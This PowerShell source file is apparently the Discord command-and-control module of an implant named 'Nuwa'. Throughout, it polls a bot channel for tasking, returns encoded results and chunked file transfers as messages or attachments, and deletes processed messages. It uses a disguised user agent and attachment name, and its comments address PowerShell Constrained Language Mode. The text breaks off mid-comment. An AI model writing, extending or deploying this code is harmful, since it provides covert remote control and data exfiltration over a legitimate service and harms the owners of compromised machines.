function Get-NuwaDiscordUserAgent {
    [CmdletBinding()]
    param()

    return 'StatusClient/1.0'
}

function Get-NuwaDiscordApiHeaders {
    [CmdletBinding()]
    param()

    return @{
        Authorization = ('Bot {0}' -f $script:NuwaConfig.DiscordToken)
        'User-Agent' = Get-NuwaDiscordUserAgent
    }
}

function Get-NuwaDiscordMessagesUri {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [int]$Limit = 100,

        [Parameter(Mandatory = $false)]
        [string]$AfterMessageId = ''
    )

    $uri = ('https://discord.com/api/v10/channels/{0}/messages?limit={1}' -f $script:NuwaConfig.BotChannel, $Limit)
    if (-not [string]::IsNullOrWhiteSpace($AfterMessageId)) {
        if ($AfterMessageId -notmatch '^[0-9]+$') {
            throw 'Discord after_message_id must contain decimal digits only'
        }
        $uri = ('{0}&after={1}' -f $uri, $AfterMessageId)
    }
    return $uri
}

function Get-NuwaDiscordChannelUri {
    [CmdletBinding()]
    param()

    return ('https://discord.com/api/v10/channels/{0}/messages' -f $script:NuwaConfig.BotChannel)
}

function ConvertTo-NuwaDiscordMessageWrapper {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [Parameter(Mandatory = $true)]
        [string]$SenderId,

        [Parameter(Mandatory = $true)]
        [bool]$ToServer
    )

    $wrapper = @{
        message = $Message
        sender_id = $SenderId
        to_server = $ToServer
        id = 1
        final = $true
    }
    $wrapper = Add-NuwaDiscordMessageFormat -Wrapper $wrapper
    $envelopeCodec = if (
        $script:NuwaConfig -and
        -not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.DiscordEnvelopeCodec)
    ) {
        [string]$script:NuwaConfig.DiscordEnvelopeCodec
    } else {
        'legacy-json'
    }
    if ($envelopeCodec -eq 'legacy-json') {
        return ($wrapper | ConvertTo-Json -Compress -Depth 10)
    }
    $context = @{
        direction = if ($ToServer) { 'agent-to-server' } else { 'server-to-agent' }
        sender_id = $SenderId
        client_id = ''
        c2_profile = 'discord'
        envelope_codec = $envelopeCodec
        envelope_version = 1
    }
    return ConvertTo-NuwaDiscordEnvelopeText `
        -Wrapper $wrapper `
        -CodecProfile $envelopeCodec `
        -Context $context
}

function ConvertFrom-NuwaDiscordJsonObject {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Value
    )

    if ([string]::IsNullOrWhiteSpace($Value)) {
        return $null
    }

    try {
        return ($Value | ConvertFrom-Json)
    } catch {
        return $null
    }
}

function ConvertFrom-NuwaDiscordContent {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$Content
    )

    if ($null -eq $Content) {
        return ''
    }

    if ($Content -is [string]) {
        return [string]$Content
    }

    if ($Content -is [byte[]]) {
        return ConvertFrom-NuwaUtf8Bytes -Bytes $Content
    }

    if ($Content -is [Array]) {
        return ConvertFrom-NuwaUtf8Bytes -Bytes ([byte[]]$Content)
    }

    return [string]$Content
}

function Get-NuwaDiscordRateLimitDelayMilliseconds {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        $ErrorRecord = $null,

        [Parameter(Mandatory = $false)]
        [string]$ResponseContent = '',

        [Parameter(Mandatory = $false)]
        [int]$StatusCode = 0
    )

    $payloadJson = $ResponseContent
    if ([string]::IsNullOrWhiteSpace($payloadJson) -and $null -ne $ErrorRecord) {
        # Direct ErrorDetails access is permitted in Windows PowerShell CLM;
        # avoid PSObject reflection and non-core WebResponse inspection.
        try {
            $errorDetails = $ErrorRecord.ErrorDetails
            if ($null -ne $errorDetails) {
                $payloadJson = [string]$errorDetails.Message
            }
        } catch {
            $payloadJson = ''
        }
    }

    if (-not [string]::IsNullOrWhiteSpace($payloadJson)) {
        $payload = ConvertFrom-NuwaDiscordJsonObject -Value $payloadJson
        $retryAfter = Get-NuwaDiscordObjectProperty -Object $payload -Name 'retry_after'
        if ($null -ne $retryAfter) {
            try {
                $retryAfterSeconds = [double]$retryAfter
                if ($retryAfterSeconds -ge 0) {
                    return [int][Math]::Ceiling(($retryAfterSeconds * 1000.0) + 100.0)
                }
            } catch {
            }
        }
    }

    # Keep the CLM-safe bounded fallback for malformed rate-limit responses
    # and transient failures whose response details are unavailable.
    return 1100
}

function Invoke-NuwaDiscordWebRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [hashtable]$InvokeParameters,

        [Parameter(Mandatory = $false)]
        [int]$MaxAttempts = 5
    )

    if (-not $InvokeParameters.ContainsKey('TimeoutSec')) {
        $InvokeParameters.TimeoutSec = 30
    }
    if (-not $InvokeParameters.ContainsKey('DisableKeepAlive')) {
        $InvokeParameters.DisableKeepAlive = $true
    }

    for ($attempt = 0; $attempt -lt $MaxAttempts; $attempt += 1) {
        try {
            return Invoke-WebRequest @InvokeParameters
        } catch {
            $delayMilliseconds = Get-NuwaDiscordRateLimitDelayMilliseconds -ErrorRecord $_
            if ($delayMilliseconds -lt 0 -or ($attempt + 1) -ge $MaxAttempts) {
                throw
            }
            Start-Sleep -Milliseconds $delayMilliseconds
        }
    }

    throw 'Discord API request exceeded retry attempts'
}

function Get-NuwaDiscordAttachmentContent {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Url,

        [Parameter(Mandatory = $true)]
        [long]$DeclaredSize
    )

    if ($DeclaredSize -lt 0 -or $DeclaredSize -gt 2097152) {
        throw 'Discord envelope attachment exceeds the UTF-8 byte limit'
    }

    $invokeParameters = @{
        Uri = $Url
        Method = 'GET'
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    $response = Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters
    $content = ConvertFrom-NuwaDiscordContent -Content $response.Content

    if ((ConvertTo-NuwaUtf8Bytes -Value $content).Length -gt 2097152) {
        throw 'Discord envelope attachment exceeds the UTF-8 byte limit'
    }

    return $content
}

function ConvertFrom-NuwaDiscordMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message
    )

    $value = ''
    if ($Message -is [string]) {
        $value = $Message
    }

    $content = Get-NuwaDiscordObjectProperty -Object $Message -Name 'content'
    $attachments = Get-NuwaDiscordObjectProperty -Object $Message -Name 'attachments'

    if ([string]::IsNullOrWhiteSpace($value) -and -not [string]::IsNullOrWhiteSpace([string]$content)) {
        $value = [string]$content
    }

    if ([string]::IsNullOrWhiteSpace($value) -and $attachments) {
        $attachment = @($attachments)[0]
        $attachmentUrl = Get-NuwaDiscordObjectProperty -Object $attachment -Name 'url'
        $attachmentSize = Get-NuwaDiscordObjectProperty -Object $attachment -Name 'size'
        if ([string]::IsNullOrWhiteSpace([string]$attachmentUrl) -or $null -eq $attachmentSize) {
            return $null
        }
        $attachmentSizeText = [string]$attachmentSize
        if ($attachmentSizeText -notmatch '^[0-9]+$') {
            return $null
        }
        try {
            $declaredSize = [long]$attachmentSizeText
        } catch {
            return $null
        }
        if ($declaredSize -gt 2097152) {
            return $null
        }
        $value = Get-NuwaDiscordAttachmentContent -Url ([string]$attachmentUrl) -DeclaredSize $declaredSize
    }

    if ([string]::IsNullOrWhiteSpace($value)) {
        return $null
    }
    if (-not (Get-Command Resolve-NuwaDiscordEnvelopeText -ErrorAction SilentlyContinue)) {
        return ConvertFrom-NuwaDiscordJsonObject -Value $value
    }
    try {
        $resolved = Resolve-NuwaDiscordEnvelopeText -Value $value -Context @{
            direction = 'server-to-agent'
            sender_id = ''
            client_id = ''
            c2_profile = 'discord'
            envelope_codec = ''
            envelope_version = 1
        }
        $parsed = $resolved.Wrapper
        $parsed | Add-Member -NotePropertyName '_nuwa_envelope_codec' -NotePropertyValue $resolved.CodecProfile -Force
        $parsed | Add-Member -NotePropertyName '_nuwa_envelope_encoded' -NotePropertyValue ([bool]$resolved.IsEncoded) -Force
        return $parsed
    } catch {
        return $null
    }
}

function Get-NuwaDiscordObjectProperty {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$Object,

        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    if ($null -eq $Object) {
        return $null
    }

    if ($Object -is [hashtable]) {
        if ($Object.ContainsKey($Name)) {
            return $Object[$Name]
        }
        return $null
    }

    try {
        return $Object.$Name
    } catch {
        return $null
    }
}

function ConvertFrom-NuwaDiscordWireBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$WireBody,

        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $true)]
        [string]$Action,

        [Parameter(Mandatory = $false)]
        [string]$Direction = 'outbound'
    )

    if ([string]::IsNullOrWhiteSpace($WireBody)) {
        return $null
    }

    $context = @{
        direction = $Direction
        uuid = $Uuid
        message_type = $Action
        c2_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.C2Profile)) {
            [string]$script:NuwaConfig.C2Profile
        } else {
            'discord'
        }
        codec_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.CodecProfile)) {
            [string]$script:NuwaConfig.CodecProfile
        } else {
            'decimal'
        }
        codec_version = '1'
    }
    $uuidLength = if ($script:NuwaConfig.MessageUuidLength) {
        [int]$script:NuwaConfig.MessageUuidLength
    } else {
        36
    }

    try {
        $decodedJson = ConvertFrom-NuwaWireBytes `
            -WireBytes (ConvertTo-NuwaUtf8Bytes -Value $WireBody) `
            -Context $context
        if ([string]::IsNullOrWhiteSpace($decodedJson)) {
            return $null
        }

        return ConvertFrom-NuwaDiscordJsonObject -Value $decodedJson
    } catch {
        return $null
    }
}

function Test-NuwaDiscordResponseMatchesRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$ExpectedRequest = $null,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedAction = ''
    )

    if ($null -eq $ExpectedRequest -or $ExpectedAction -ne 'post_response') {
        return $true
    }

    $messageResponse = Get-NuwaDiscordObjectProperty -Object $Message -Name '_nuwa_decoded_body'
    if ($null -eq $messageResponse) {
        return $true
    }

    $requestResponses = @(Get-NuwaDiscordObjectProperty -Object $ExpectedRequest -Name 'responses')
    $messageResponses = @(Get-NuwaDiscordObjectProperty -Object $messageResponse -Name 'responses')
    if ($requestResponses.Count -eq 0 -or $messageResponses.Count -eq 0) {
        return $true
    }

    $requestEntry = $requestResponses[0]
    $messageEntry = $messageResponses[0]
    if ($null -eq $requestEntry -or $null -eq $messageEntry) {
        return $true
    }

    $requestTaskId = [string](Get-NuwaDiscordObjectProperty -Object $requestEntry -Name 'task_id')
    $messageTaskId = [string](Get-NuwaDiscordObjectProperty -Object $messageEntry -Name 'task_id')
    if (
        -not [string]::IsNullOrWhiteSpace($requestTaskId) -and
        -not [string]::IsNullOrWhiteSpace($messageTaskId) -and
        $requestTaskId -ne $messageTaskId
    ) {
        return $false
    }

    $requestUpload = Get-NuwaDiscordObjectProperty -Object $requestEntry -Name 'upload'
    if ($null -ne $requestUpload) {
        $requestChunkNum = Get-NuwaDiscordObjectProperty -Object $requestUpload -Name 'chunk_num'
        $messageChunkNum = Get-NuwaDiscordObjectProperty -Object $messageEntry -Name 'chunk_num'
        if ($null -ne $requestChunkNum -and $null -ne $messageChunkNum -and [int]$requestChunkNum -ne [int]$messageChunkNum) {
            return $false
        }

        $requestFileId = [string](Get-NuwaDiscordObjectProperty -Object $requestUpload -Name 'file_id')
        $messageFileId = [string](Get-NuwaDiscordObjectProperty -Object $messageEntry -Name 'file_id')
        if (
            -not [string]::IsNullOrWhiteSpace($requestFileId) -and
            -not [string]::IsNullOrWhiteSpace($messageFileId) -and
            $requestFileId -ne $messageFileId
        ) {
            return $false
        }
    }

    $requestDownload = Get-NuwaDiscordObjectProperty -Object $requestEntry -Name 'download'
    if ($null -ne $requestDownload) {
        $requestChunkNum = Get-NuwaDiscordObjectProperty -Object $requestDownload -Name 'chunk_num'
        $messageChunkNum = Get-NuwaDiscordObjectProperty -Object $messageEntry -Name 'chunk_num'
        if ($null -ne $requestChunkNum -and $null -ne $messageChunkNum -and [int]$requestChunkNum -ne [int]$messageChunkNum) {
            return $false
        }

        $requestFileId = [string](Get-NuwaDiscordObjectProperty -Object $requestDownload -Name 'file_id')
        $messageFileId = [string](Get-NuwaDiscordObjectProperty -Object $messageEntry -Name 'file_id')
        if (
            -not [string]::IsNullOrWhiteSpace($requestFileId) -and
            -not [string]::IsNullOrWhiteSpace($messageFileId) -and
            $requestFileId -ne $messageFileId
        ) {
            return $false
        }
    }

    return $true
}

function Find-NuwaDiscordInboundMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [AllowNull()]
        [AllowEmptyCollection()]
        [object[]]$Messages,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedClientId,

        [Parameter(Mandatory = $false)]
        [string[]]$AlternateClientIds = @(),

        [Parameter(Mandatory = $false)]
        [string]$ExpectedAction = '',

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = '',

        [Parameter(Mandatory = $false)]
        [DateTimeOffset]$MinimumTimestamp = [DateTimeOffset]::MinValue,

        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [object]$ExpectedRequest = $null,

        [Parameter(Mandatory = $false)]
        [switch]$RequireExpectedClientId
    )

    if ($null -eq $Messages) {
        return $null
    }

    $candidates = @()
    $requestMatchedCandidates = @()
    foreach ($message in $Messages) {
        $messageId = Get-NuwaDiscordMessageId -Message $message
        if (
            -not [string]::IsNullOrWhiteSpace($messageId) -and
            $script:NuwaDiscordProcessedMessageIds -and
            ($script:NuwaDiscordProcessedMessageIds -contains $messageId)
        ) {
            continue
        }
        if (-not (Test-NuwaDiscordMessageTimestamp -Message $message -MinimumTimestamp $MinimumTimestamp)) {
            continue
        }
        $parsed = ConvertFrom-NuwaDiscordMessage -Message $message
        if ($null -eq $parsed) {
            continue
        }
        if ($parsed.to_server) {
            continue
        }
        $targetClientId = [string](Get-NuwaDiscordObjectProperty -Object $parsed -Name 'client_id')
        if ([string]::IsNullOrWhiteSpace($targetClientId)) {
            $targetClientId = [string](Get-NuwaDiscordObjectProperty -Object $parsed -Name 'sender_id')
        }
        if ($RequireExpectedClientId -and $targetClientId -ne $ExpectedClientId) {
            continue
        }
        $acceptedClientIds = @($ExpectedClientId)
        foreach ($alternateClientId in $AlternateClientIds) {
            if (-not [string]::IsNullOrWhiteSpace([string]$alternateClientId)) {
                $acceptedClientIds += [string]$alternateClientId
            }
        }
        if ($acceptedClientIds -notcontains $targetClientId) {
            continue
        }
        if (-not [string]::IsNullOrWhiteSpace($ExpectedAction)) {
            $decodeCandidates = @()
            if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid)) {
                $decodeCandidates += $ExpectedUuid
            }
            foreach ($acceptedClientId in $acceptedClientIds) {
                if (-not [string]::IsNullOrWhiteSpace([string]$acceptedClientId)) {
                    $decodeCandidates += [string]$acceptedClientId
                }
            }
            if (-not [string]::IsNullOrWhiteSpace($targetClientId)) {
                $decodeCandidates += $targetClientId
            }
            $parsedSenderId = [string](Get-NuwaDiscordObjectProperty -Object $parsed -Name 'sender_id')
            if (-not [string]::IsNullOrWhiteSpace($parsedSenderId)) {
                $decodeCandidates += $parsedSenderId
            }

            $parsedMessageBody = [string](Get-NuwaDiscordObjectProperty -Object $parsed -Name 'message')
            $resolvedBody = $null
            if ($ExpectedAction -eq 'post_response' -and [string]::IsNullOrWhiteSpace($parsedMessageBody)) {
                $acknowledgementUuid = if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid)) {
                    $ExpectedUuid
                } else {
                    $targetClientId
                }
                $acknowledgementJson = '{"action":"post_response","responses":[]}'
                $acknowledgementContext = @{
                    direction = 'inbound'
                    uuid = $acknowledgementUuid
                    message_type = 'post_response'
                    c2_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.C2Profile)) {
                        [string]$script:NuwaConfig.C2Profile
                    } else {
                        'discord'
                    }
                    codec_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.CodecProfile)) {
                        [string]$script:NuwaConfig.CodecProfile
                    } else {
                        'decimal'
                    }
                    codec_version = '1'
                }
                $resolvedBody = @{
                    Decoded = ConvertFrom-NuwaDiscordJsonObject -Value $acknowledgementJson
                    Uuid = $acknowledgementUuid
                    WireBody = ConvertFrom-NuwaUtf8Bytes -Bytes (
                        ConvertTo-NuwaWireBytes `
                            -MessageJson $acknowledgementJson `
                            -Context $acknowledgementContext
                    )
                }
            } else {
                $resolvedBody = Resolve-NuwaDiscordDecodedBody `
                    -Message $parsed `
                    -ExpectedAction $ExpectedAction `
                    -CandidateUuids $decodeCandidates
            }
            if ($null -eq $resolvedBody) {
                continue
            }
            if (
                $null -ne (Get-NuwaDiscordObjectProperty -Object $resolvedBody.Decoded -Name 'action') -and
                [string](Get-NuwaDiscordObjectProperty -Object $resolvedBody.Decoded -Name 'action') -ne $ExpectedAction
            ) {
                continue
            }
            $parsed | Add-Member -NotePropertyName '_nuwa_decoded_body' -NotePropertyValue $resolvedBody.Decoded -Force
            $parsed | Add-Member -NotePropertyName '_nuwa_wire_body' -NotePropertyValue $resolvedBody.WireBody -Force
            $parsed | Add-Member -NotePropertyName '_nuwa_decode_uuid' -NotePropertyValue $resolvedBody.Uuid -Force
        }
        if (-not [string]::IsNullOrWhiteSpace($messageId)) {
            $parsed | Add-Member -NotePropertyName '_discord_message_id' -NotePropertyValue $messageId -Force
        }
        $candidates += $parsed
        if (Test-NuwaDiscordResponseMatchesRequest -Message $parsed -ExpectedRequest $ExpectedRequest -ExpectedAction $ExpectedAction) {
            $requestMatchedCandidates += $parsed
        }
    }

    if ($ExpectedAction -eq 'get_tasking') {
        foreach ($candidate in $requestMatchedCandidates) {
            if (Test-NuwaDiscordMessageHasTasks -Message $candidate -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid) {
                return $candidate
            }
        }
        foreach ($candidate in $candidates) {
            if (Test-NuwaDiscordMessageHasTasks -Message $candidate -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid) {
                return $candidate
            }
        }
    }

    if ($requestMatchedCandidates.Count -gt 0) {
        return $requestMatchedCandidates[0]
    }

    if ($candidates.Count -gt 0) {
        return $candidates[0]
    }

    return $null
}

function Get-NuwaDiscordMessageId {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message
    )

    return [string](Get-NuwaDiscordObjectProperty -Object $Message -Name 'id')
}

function Test-NuwaDiscordMessageTimestamp {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $false)]
        [DateTimeOffset]$MinimumTimestamp = [DateTimeOffset]::MinValue
    )

    if ($MinimumTimestamp -eq [DateTimeOffset]::MinValue) {
        return $true
    }

    $timestampValue = Get-NuwaDiscordObjectProperty -Object $Message -Name 'timestamp'
    if ([string]::IsNullOrWhiteSpace([string]$timestampValue)) {
        return $false
    }

    try {
        return ([DateTimeOffset](Get-Date -Date ([string]$timestampValue)) -gt $MinimumTimestamp)
    } catch {
        return $false
    }
}

function Test-NuwaDiscordInboundMessageAction {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = ''
    )

    if ([string]::IsNullOrWhiteSpace($ExpectedAction)) {
        return $true
    }

    $decoded = ConvertFrom-NuwaDiscordDecodedBody -Message $Message -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid
    if ($null -eq $decoded) {
        return $false
    }
    $action = Get-NuwaDiscordObjectProperty -Object $decoded -Name 'action'
    if ($null -eq $action) {
        return $true
    }

    return ([string]$action -eq $ExpectedAction)
}

function ConvertFrom-NuwaDiscordDecodedBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = ''
    )

    $messageBody = [string](Get-NuwaDiscordObjectProperty -Object $Message -Name 'message')
    if ([string]::IsNullOrWhiteSpace($messageBody)) {
        return $null
    }

    $cachedDecoded = Get-NuwaDiscordObjectProperty -Object $Message -Name '_nuwa_decoded_body'
    if ($null -ne $cachedDecoded) {
        if (
            $null -eq (Get-NuwaDiscordObjectProperty -Object $cachedDecoded -Name 'action') -or
            [string](Get-NuwaDiscordObjectProperty -Object $cachedDecoded -Name 'action') -eq $ExpectedAction
        ) {
            return $cachedDecoded
        }
    }

    $uuid = if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid)) {
        $ExpectedUuid
    } else {
        $messageClientId = [string](Get-NuwaDiscordObjectProperty -Object $Message -Name 'client_id')
        if (-not [string]::IsNullOrWhiteSpace($messageClientId)) {
            $messageClientId
        } else {
            [string](Get-NuwaDiscordObjectProperty -Object $Message -Name 'sender_id')
        }
    }

    $context = @{
        direction = 'inbound'
        uuid = $uuid
        message_type = $ExpectedAction
        c2_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.C2Profile)) {
            [string]$script:NuwaConfig.C2Profile
        } else {
            'discord'
        }
        codec_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.CodecProfile)) {
            [string]$script:NuwaConfig.CodecProfile
        } else {
            'decimal'
        }
        codec_version = '1'
    }
    $uuidLength = if ($script:NuwaConfig.MessageUuidLength) {
        [int]$script:NuwaConfig.MessageUuidLength
    } else {
        36
    }

    try {
        $decodedJson = ConvertFrom-NuwaResponseBody `
            -ResponseBody $messageBody `
            -ExpectedUuid $uuid `
            -UuidLength $uuidLength `
            -Context $context
        if ([string]::IsNullOrWhiteSpace($decodedJson)) {
            return $null
        }

        return (ConvertFrom-NuwaDiscordJsonObject -Value $decodedJson)
    } catch {
        return $null
    }
}

function Resolve-NuwaDiscordDecodedBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string[]]$CandidateUuids = @()
    )

    $messageBody = [string](Get-NuwaDiscordObjectProperty -Object $Message -Name 'message')
    if ([string]::IsNullOrWhiteSpace($messageBody)) {
        return $null
    }

    $uuidLength = if ($script:NuwaConfig.MessageUuidLength) {
        [int]$script:NuwaConfig.MessageUuidLength
    } else {
        36
    }

    $attemptedUuids = @()
    foreach ($candidateUuid in $CandidateUuids) {
        $candidate = [string]$candidateUuid
        if ([string]::IsNullOrWhiteSpace($candidate) -or ($attemptedUuids -contains $candidate)) {
            continue
        }
        $attemptedUuids += $candidate

        $context = @{
            direction = 'inbound'
            uuid = $candidate
            message_type = $ExpectedAction
            c2_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.C2Profile)) {
                [string]$script:NuwaConfig.C2Profile
            } else {
                'discord'
            }
            codec_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.CodecProfile)) {
                [string]$script:NuwaConfig.CodecProfile
            } else {
                'decimal'
            }
            codec_version = '1'
        }

        try {
            $resolved = Resolve-NuwaResponseBody `
                -ResponseBody $messageBody `
                -ExpectedUuid $candidate `
                -UuidLength $uuidLength `
                -Context $context
            if ($null -eq $resolved -or [string]::IsNullOrWhiteSpace([string]$resolved.Json)) {
                continue
            }

            $decoded = ConvertFrom-NuwaDiscordJsonObject -Value ([string]$resolved.Json)
            if ($null -eq $decoded) {
                continue
            }

            return @{
                Decoded = $decoded
                Uuid = [string]$resolved.Uuid
                WireBody = [string]$resolved.WireBody
            }
        } catch {
            continue
        }
    }

    return $null
}

function Test-NuwaDiscordMessageHasTasks {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [object]$Message,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedAction,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedUuid = ''
    )

    $decoded = ConvertFrom-NuwaDiscordDecodedBody -Message $Message -ExpectedAction $ExpectedAction -ExpectedUuid $ExpectedUuid
    if ($null -eq $decoded) {
        return $false
    }
    $tasks = Get-NuwaDiscordObjectProperty -Object $decoded -Name 'tasks'
    if ($null -eq $tasks) {
        return $false
    }

    return (@($tasks).Count -gt 0)
}

function Get-NuwaDiscordMessages {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [string]$AfterMessageId = ''
    )

    $invokeParameters = @{
        Uri = Get-NuwaDiscordMessagesUri -AfterMessageId $AfterMessageId
        Method = 'GET'
        Headers = Get-NuwaDiscordApiHeaders
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    $response = Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters
    $rawContent = ConvertFrom-NuwaDiscordContent -Content $response.Content
    if ([string]::IsNullOrWhiteSpace($rawContent)) {
        return @()
    }
    $parsed = $rawContent | ConvertFrom-Json
    if ($null -eq $parsed) {
        return @()
    }
    return $parsed
}

function Remove-NuwaDiscordMessage {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$MessageId
    )

    $invokeParameters = @{
        Uri = ('{0}/{1}' -f (Get-NuwaDiscordChannelUri), $MessageId)
        Method = 'DELETE'
        Headers = Get-NuwaDiscordApiHeaders
        TimeoutSec = 5
        DisableKeepAlive = $true
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters -MaxAttempts 1 | Out-Null
}

function Send-NuwaDiscordApiJson {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Content
    )

    $invokeParameters = @{
        Uri = Get-NuwaDiscordChannelUri
        Method = 'POST'
        Headers = Get-NuwaDiscordApiHeaders
        Body = (@{ content = $Content } | ConvertTo-Json -Compress)
        ContentType = 'application/json'
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    $response = Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters
    $content = ConvertFrom-NuwaDiscordContent -Content $response.Content
    return ConvertFrom-NuwaDiscordJsonObject -Value $content
}

function New-NuwaDiscordMultipartBoundary {
    [CmdletBinding()]
    param()

    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
    $boundary = 'Nuwa'
    for ($index = 0; $index -lt 24; $index += 1) {
        $boundary += $alphabet[(Get-Random -Minimum 0 -Maximum $alphabet.Length)]
    }
    return $boundary
}

function ConvertTo-NuwaDiscordMultipartBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Content,

        [Parameter(Mandatory = $true)]
        [string]$Boundary
    )

    if ([string]::IsNullOrWhiteSpace($Boundary) -or $Boundary -notmatch '^[A-Za-z0-9_-]+$') {
        throw 'Discord multipart boundary is invalid'
    }

    $payloadJson = '{"content":""}'
    $multipart = (
        '--' + $Boundary + "`r`n" +
        'Content-Disposition: form-data; name="payload_json"' + "`r`n" +
        'Content-Type: application/json' + "`r`n`r`n" +
        $payloadJson + "`r`n" +
        '--' + $Boundary + "`r`n" +
        'Content-Disposition: form-data; name="files[0]"; filename="status-server"' + "`r`n" +
        'Content-Type: application/json' + "`r`n`r`n" +
        $Content + "`r`n" +
        '--' + $Boundary + "--`r`n"
    )
    $bytes = [byte[]](ConvertTo-NuwaUtf8Bytes -Value $multipart)
    return ,$bytes
}

function Send-NuwaDiscordApiAttachment {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Content
    )

    $boundary = New-NuwaDiscordMultipartBoundary
    $invokeParameters = @{
        Uri = Get-NuwaDiscordChannelUri
        Method = 'POST'
        Headers = Get-NuwaDiscordApiHeaders
        Body = (ConvertTo-NuwaDiscordMultipartBody -Content $Content -Boundary $boundary)
        ContentType = ('multipart/form-data; boundary={0}' -f $boundary)
        UseBasicParsing = $true
    }
    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
    $response = Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters
    $responseContent = ConvertFrom-NuwaDiscordContent -Content $response.Content
    return ConvertFrom-NuwaDiscordJsonObject -Value $responseContent
}

function Invoke-NuwaDiscordRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowEmptyString()]
        [string]$TransportBody = '',

        [Parameter(Mandatory = $true)]
        [string]$WireBody,

        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedAction = ''
    )

    if ([string]::IsNullOrWhiteSpace($TransportBody)) {
        $TransportBody = $WireBody
    }
    $wrapper = ConvertTo-NuwaDiscordMessageWrapper -Message $TransportBody -SenderId $Uuid -ToServer $true
    $expectedRequest = ConvertFrom-NuwaDiscordWireBody -WireBody $WireBody -Uuid $Uuid -Action $ExpectedAction -Direction 'outbound'
    $requestStartedAt = [DateTimeOffset]::UtcNow
    $previousRequestStartedAt = $script:NuwaDiscordLastRequestStartedAt
    $script:NuwaDiscordLastRequestStartedAt = $requestStartedAt
    $pendingTaskingMinimumTimestamp = $requestStartedAt
    if ($ExpectedAction -eq 'get_tasking') {
        # The C2 service can post a task while Nuwa is still finishing the
        # preceding response.  It then falls before this request's Discord
        # message ID, so the fallback must include the preceding request
        # boundary without reopening the full channel history.
        # Retain the prior tasking boundary rather than the immediately
        # preceding request. A task can be posted while a post_response or
        # update_info exchange is completing; that message then predates the
